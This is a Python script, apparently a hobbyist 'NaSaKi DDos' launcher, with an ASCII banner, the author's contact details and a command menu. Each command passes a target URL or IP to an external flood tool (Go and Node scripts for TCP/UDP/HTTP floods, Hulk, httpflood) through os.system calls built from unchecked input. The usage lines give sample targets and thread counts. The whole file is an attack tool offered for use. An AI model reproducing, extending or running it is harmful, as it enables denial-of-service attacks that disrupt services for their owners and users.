##############################
#     NaSaKi By Trung Hải    #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def si():
    print('\x1b')
    clear()
    print('\x1b[38;2;0;255;255mNaSaKi DDos V1.0.1 NaSaki DDos By LeTrungHai')
    print("")

def menu():
    sys.stdout.write(f"         \x1b]2;NaSaKi DDos")
    clear()
    si()     
    print(f'''        

               \x1b[38;2;0;212;14m      █████████████████████████████████████
               \x1b[38;2;0;212;14m      █▄─▀█▄─▄██▀▄─██─▄▄▄▄██▀▄─██▄─█─▄█▄─▄█
               \x1b[38;2;0;212;14m      ██─█▄▀─███─▀─██▄▄▄▄─██─▀─███─▄▀███─██
               \x1b[38;2;0;212;14m      ▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀                                    
               \x1b[38;2;0;212;14m             ╔═══════════════════╗                  
               \x1b[38;2;0;212;14m╔════════════╩═══[NaSaKi-DDos]═══╩════════════╗
               \x1b[38;2;0;212;14m║   Zalo: 0369563113                          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   Contact: 0369563113                       \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   FB: fb.com/trung.hai.62                   \x1b[38;2;0;212;14m║                                                         
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstress            \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═════════════════════════════════════════════╝
''')

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;255;255mInput :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()


# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# LAYER 7 METHODS
 
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

def login():
    main()
login()
